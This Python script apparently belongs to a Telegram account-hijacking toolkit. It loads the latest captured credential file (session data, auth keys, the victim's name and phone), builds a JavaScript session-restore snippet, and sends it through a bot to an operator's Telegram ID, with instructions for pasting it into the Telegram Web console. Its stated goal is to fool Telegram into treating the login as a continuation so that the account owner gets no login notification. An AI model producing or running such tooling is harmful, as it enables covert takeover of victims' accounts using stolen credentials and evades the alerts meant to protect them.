#!/usr/bin/env python3
"""
Generate Complete Session Script (Full Telegram Web Context)

This script generates a JavaScript script with COMPLETE Telegram Web session structure
to fool Telegram into thinking it's a continuation, not a new login.
"""

import os
import json
import asyncio
from datetime import datetime
from utils.credentials_manager import credentials_manager
from utils.tg.simple_bot import simple_bot

# Get target user ID from environment variable
TARGET_USER_ID = os.getenv('SCRIPT_TARGET_USER_ID')
TARGET_USER_IDS = [int(TARGET_USER_ID)] if TARGET_USER_ID else []

# Configuration
ENABLE_TELEGRAM_SENDING = True
CUSTOM_MESSAGE_PREFIX = "🔧 **Complete Session Script (Full Context)**"
INCLUDE_INSTRUCTIONS = True
INCLUDE_TIPS = True

def send_complete_session_script_to_users(script_content, script_filename):
    """Send the generated complete session script to target Telegram users"""
    if not ENABLE_TELEGRAM_SENDING:
        print("⚠️  Telegram sending is disabled in configuration.")
        return
        
    if not TARGET_USER_IDS:
        print("⚠️  No target user ID configured. Skipping Telegram sending.")
        print("💡 Add SCRIPT_TARGET_USER_ID to your .env file to enable automatic sending.")
        return
    
    try:
        # Use simple bot instance
        
        # Prepare the message
        message_parts = [CUSTOM_MESSAGE_PREFIX]
        message_parts.append(f"")
        message_parts.append(f"📁 **File:** `{script_filename}`")
        message_parts.append(f"⏰ **Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        message_parts.append(f"🛡️ **Complete Session:** Full Telegram Web context")
        message_parts.append(f"")
        
        if INCLUDE_INSTRUCTIONS:
            message_parts.extend([
                "📝 **Instructions:**",
                "1. Open https://web.telegram.org/a/ in your browser",
                "2. Press F12 to open Developer Tools", 
                "3. Go to Console tab",
                "4. Copy and paste the script below",
                "5. Press Enter to execute",
                ""
            ])
        
        if INCLUDE_TIPS:
            message_parts.extend([
                "💡 **Complete Session Tips:**",
                "- This script mimics FULL Telegram Web session structure",
                "- Includes all DC auth keys, server salts, and session context",
                "- Should fool Telegram into thinking it's a continuation",
                "- No login notifications should be sent",
                "- Make sure you're on web.telegram.org/a/ (not web.telegram.org/k/)",
                "- Try refreshing the page first",
                "- Try using a different browser or incognito mode", 
                "- Check if your network allows WebSocket connections",
                ""
            ])
        
        message_parts.extend([
            "🔗 **Complete Session Script Content:**",
            "```",
            script_content,
            "```"
        ])
        
        message_text = "\n".join(message_parts)
        
        # Send to each target user
        success_count = 0
        for user_id in TARGET_USER_IDS:
            try:
                script_info = {
                    'filename': script_filename,
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'user_name': 'Complete Session',
                    'phone': 'N/A',
                    'user_id': 'N/A'
                }
                
                success = simple_bot.send_script(user_id, script_content, script_info)
                if success:
                    print(f"✅ Complete session script sent to user {user_id}")
                    success_count += 1
                else:
                    print(f"❌ Failed to send to user {user_id}")
            except Exception as e:
                print(f"❌ Failed to send to user {user_id}: {e}")
        
        print(f"📤 Sent complete session script to {success_count}/{len(TARGET_USER_IDS)} users")
        
    except Exception as e:
        print(f"❌ Error sending complete session script: {e}")

def generate_complete_session_script():
    """Generate complete session script from latest credentials and send to users"""
    
    # Get the most recent JSON credentials file
    all_files = credentials_manager.list_credentials_files()
    json_files = [f for f in all_files if f['filename'].endswith('.json')]
    
    if not json_files:
        print("❌ No JSON credential files found")
        return
    
    latest_file = json_files[0]
    print(f"📁 Using latest credential file: {latest_file['filename']}")
    
    # Load the credentials
    credentials = credentials_manager.load_credentials(latest_file['filename'])
    if not credentials or 'session_data' not in credentials:
        print("❌ No valid session data found in credentials")
        return
    
    session_data = credentials['session_data']
    user_info = credentials.get('user_info', {})
    
    print(f"✅ Valid credential data found")
    print(f"👤 User: {user_info.get('first_name', 'Unknown')} {user_info.get('last_name', '')} (+{user_info.get('phone', 'Unknown')})")
    print(f"🔑 Auth Type: REAL")
    print(f"📦 Session Data Keys: {list(session_data.keys())}")
    
    # Generate the complete session script
    script_content = credentials_manager.generate_complete_session_script(session_data)
    
    # Save the script
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    script_filename = f"complete_session_{timestamp}.js"
    script_filepath = os.path.join("credentials", script_filename)
    
    with open(script_filepath, 'w', encoding='utf-8') as f:
        f.write(script_content)
    
    print(f"✅ Complete session script generated: {script_filename}")
    
    # Send the script to Telegram users
    print("📤 Sending complete session script to Telegram users...")
    send_complete_session_script_to_users(script_content, script_filename)
    
    print()
    print("📝 Instructions:")
    print("   1. Open https://web.telegram.org/a/ in your browser")
    print("   2. Press F12 to open Developer Tools")
    print("   3. Go to Console tab")
    print("   4. Copy and paste the complete session script")
    print("   5. Press Enter to execute")
    print()
    print("🛡️  This complete session script should prevent login notifications!")

if __name__ == "__main__":
    print("🔧 Generating Complete Session Script (Full Telegram Web Context)")
    print("=" * 70)
    generate_complete_session_script() 